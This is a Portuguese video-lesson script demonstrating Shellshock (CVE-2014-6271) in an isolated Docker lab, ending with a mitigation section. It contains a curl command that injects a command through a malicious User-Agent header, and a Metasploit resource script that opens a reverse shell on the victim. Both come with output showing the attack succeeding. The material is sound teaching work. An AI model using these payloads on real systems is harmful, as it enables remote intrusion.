# Roteiro da videoaula - Shellshock com Metasploit

Duracao alvo: 20 minutos.

Tema: exploracao controlada da vulnerabilidade Shellshock (CVE-2014-6271) em
um servidor Apache CGI vulneravel, usando Docker e Metasploit.

## 0:00 - 1:00 | Abertura

### O que mostrar

- Tela inicial do projeto.
- Arquivos principais:
  - `docker-compose.yml`
  - `victim/Dockerfile`
  - `victim/cgi/status.cgi`
  - `metasploit/shellshock.rc`
  - `docs/relatorio.md`

### Fala sugerida

Neste video vamos demonstrar um ataque Shellshock em ambiente controlado. A
vitima e um container com Apache CGI executando um script interpretado por uma
versao vulneravel do Bash. O atacante e outro container com Metasploit. O
objetivo e mostrar o conceito da vulnerabilidade, validar manualmente a falha,
executar o exploit via Metasploit e discutir mitigacoes.

Importante deixar claro que o ataque e feito apenas em rede isolada de
laboratorio, contra uma vitima criada especificamente para o trabalho.

## 1:00 - 3:30 | Conceito do ataque

### O que mostrar

- Secao `Padrao de ataque` em `docs/relatorio.md`.
- Padrao:

```text
() { :;}; comando_malicioso
```

### Fala sugerida

Shellshock e uma vulnerabilidade do GNU Bash registrada como CVE-2014-6271. Ela
ocorre porque versoes vulneraveis do Bash interpretam de forma incorreta
variaveis de ambiente que parecem definicoes de funcao.

O padrao usado no ataque e uma falsa funcao:

```text
() { :;}; comando_malicioso
```

A parte `() { :;};` parece uma definicao de funcao para o Bash vulneravel. O
problema e que tudo que vem depois tambem pode ser executado como comando.

Em servidores CGI, cabecalhos HTTP como `User-Agent`, `Cookie` e `Referer` sao
convertidos em variaveis de ambiente. Assim, se um CGI for executado por um Bash
vulneravel, um cabecalho HTTP pode virar uma forma de execucao remota de
comandos.

## 3:30 - 5:30 | Ambiente controlado

### O que mostrar

- `docker-compose.yml`
- Rede e IPs:
  - atacante: `172.28.0.10`
  - vitima: `172.28.0.20`
  - rede: `pentest_net`, interna

### Fala sugerida

O laboratorio usa Docker Compose com dois containers. O container `attacker`
tem o Metasploit Framework e fica no IP `172.28.0.10`. O container `victim`
executa Apache CGI com Bash 4.3 vulneravel e fica no IP `172.28.0.20`.

A rede e marcada como `internal: true`, entao a comunicacao fica restrita ao
ambiente do laboratorio. Isso ajuda a manter o experimento controlado.

### Comando

```bash
docker compose up --build
```

### Saida observada

```text
[+] up 4/4
Image shellshock-victim:local   Built
Image metasploit-attacker:local Built
Container attacker              Recreated
Container victim                Recreated
Attaching to attacker, victim
```

### Observacao para falar

O Apache pode mostrar um aviso de `ServerName`. Esse aviso nao impede a
demonstracao.

```text
apache2: Could not reliably determine the server's fully qualified domain name
```

## 5:30 - 7:30 | Validacao normal da vitima

### O que mostrar

- Terminal em outro shell WSL.

### Comando

```bash
docker exec -it attacker curl http://172.28.0.20/cgi-bin/status.cgi
```

### Saida observada

```text
Shellshock lab victim
CGI script executed as: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Server time: Mon Jun 15 17:05:15 UTC 2026
```

### Fala sugerida

Antes de explorar, verificamos se o CGI responde normalmente. A resposta mostra
que o script esta rodando como `www-data`, que e o usuario do Apache. Isso e
importante porque, se o ataque funcionar, os comandos tambem serao executados
com esse nivel de privilegio.

## 7:30 - 10:00 | Prova manual da vulnerabilidade

### O que mostrar

- Comando `curl` com cabecalho `User-Agent` malicioso.
- Checagem do arquivo criado na vitima.

### Comandos

```bash
docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellshock-proof' http://172.28.0.20/cgi-bin/status.cgi
docker exec -it victim ls -l /tmp/shellshock-proof
```

### Saida observada

```text
500 Internal Server Error
```

E depois:

```text
-rw-r--r-- 1 www-data www-data 0 Jun 15 17:05 /tmp/shellshock-proof
```

### Fala sugerida

Aqui enviamos um `User-Agent` contendo o padrao do Shellshock. O comando
injetado e simples e inofensivo para a demonstracao: ele cria o arquivo
`/tmp/shellshock-proof` na vitima.

Mesmo que o Apache responda `500 Internal Server Error`, a exploracao funcionou,
porque o segundo comando mostra que o arquivo foi criado. O dono do arquivo e
`www-data`, confirmando que o comando foi executado pelo processo web.

Esse teste manual e util porque mostra a vulnerabilidade sem depender ainda do
Metasploit.

## 10:00 - 12:00 | Configuracao do exploit no Metasploit

### O que mostrar

- Arquivo `metasploit/shellshock.rc`.

### Conteudo importante

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
run
```

### Fala sugerida

O modulo usado e `exploit/multi/http/apache_mod_cgi_bash_env_exec`. Ele explora
a injecao em variaveis de ambiente via Apache CGI.

O `RHOSTS` aponta para a vitima, `172.28.0.20`. O `TARGETURI` aponta para o CGI
vulneravel, `/cgi-bin/status.cgi`. O payload escolhido e
`generic/shell_reverse_tcp`, que abre uma shell reversa da vitima para o
atacante.

O `LHOST` e o IP do atacante na rede Docker, `172.28.0.10`, e o `LPORT` e a
porta que vai receber a conexao reversa.

## 12:00 - 15:00 | Execucao do Metasploit

### O que mostrar

- Terminal executando o Metasploit.

### Comando

```bash
docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
```

### Saida esperada/observada

```text
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.28.0.20
set RPORT 80
set TARGETURI /cgi-bin/status.cgi
set TARGET 0
set PAYLOAD generic/shell_reverse_tcp
set LHOST 172.28.0.10
set LPORT 4444
check
[+] 172.28.0.20:80 - The target is vulnerable.
run
[*] Started reverse TCP handler on 172.28.0.10:4444
[*] Command Stager progress - 100.00% done (817/817 bytes)
[*] Command shell session 1 opened (172.28.0.10:4444 -> 172.28.0.20:40536)
```

### Fala sugerida

O `check` do modulo confirmou que o alvo e vulneravel. Em seguida, o `run`
executou o exploit, iniciou um handler TCP reverso no atacante e abriu uma
sessao de shell.

Essa linha e a prova principal da exploracao via Metasploit:

```text
Command shell session 1 opened
```

Se o Metasploit voltar para o prompt `msf6`, entramos na sessao com:

```text
sessions -i 1
```

## 15:00 - 16:30 | Demonstracao da sessao obtida

### O que mostrar

- Comandos dentro da shell obtida.

### Comandos

```bash
id
hostname
pwd
cat /etc/os-release
```

### Fala sugerida

Agora os comandos sao executados dentro da vitima. O comando `id` deve mostrar
o usuario `www-data`, que confirma que a execucao remota acontece com os
privilegios do servidor web. O `hostname` identifica o container da vitima, e o
`cat /etc/os-release` mostra o sistema usado no laboratorio.

O ataque nao da root automaticamente. Ele da execucao remota como o usuario do
servico vulneravel. Ainda assim, isso ja e grave: um atacante poderia ler
arquivos acessiveis ao servidor web, movimentar-se pelo ambiente, baixar outros
payloads ou tentar escalar privilegios.

## 16:30 - 18:30 | Mitigacoes e defesas

### O que mostrar

- Secao de defesas do relatorio.

### Fala sugerida

A principal mitigacao e atualizar o Bash para uma versao corrigida. Shellshock
foi corrigido em 2014, entao sistemas atualizados nao deveriam aceitar esse
padrao de variavel de ambiente.

Outra defesa e remover CGI quando ele nao for necessario. CGI e uma superficie
classica para esse tipo de ataque porque transforma dados da requisicao HTTP em
variaveis de ambiente.

Tambem e importante executar o servidor web com usuario de baixo privilegio,
como ocorreu no laboratorio com `www-data`. Isso nao impede a exploracao, mas
limita o impacto inicial.

Defesas complementares incluem:

- WAF ou reverse proxy filtrando cabecalhos suspeitos.
- Restricao de trafego de saida, dificultando shells reversas.
- Segmentacao de rede.
- Monitoramento de logs HTTP.
- AppArmor, SELinux ou perfis seccomp para limitar processos.

## 18:30 - 20:00 | Fechamento

### O que mostrar

- Resumo do fluxo no `README.md`.
- Arquivos que serao entregues.

### Fala sugerida

Neste laboratorio, primeiro validamos o funcionamento normal do CGI. Depois
provamos manualmente a vulnerabilidade criando um arquivo na vitima por meio de
um cabecalho HTTP malicioso. Por fim, usamos o Metasploit com o modulo
`apache_mod_cgi_bash_env_exec` e o payload `generic/shell_reverse_tcp`, obtendo
uma shell reversa.

O ponto central do ataque e que dados controlados pelo cliente, como
`User-Agent`, foram transformados em variaveis de ambiente e interpretados por
um Bash vulneravel.

Como mitigacao, a defesa mais importante e atualizar o Bash e reduzir a
superficie CGI. Em um ambiente real, tambem seriam importantes segmentacao,
controle de saida de rede, monitoramento e hardening do servico web.

## Checklist para gravacao

- Deixar `docker compose up --build` rodando em um terminal.
- Usar outro terminal para os comandos `docker exec`.
- Mostrar a resposta normal do CGI.
- Mostrar o `500 Internal Server Error` e explicar que a prova e o arquivo
  criado.
- Mostrar `The target is vulnerable`.
- Mostrar `Command shell session 1 opened`.
- Entrar na sessao com `sessions -i 1`, se necessario.
- Executar `id`, `hostname`, `pwd` e `cat /etc/os-release`.
- Encerrar explicando mitigacoes.

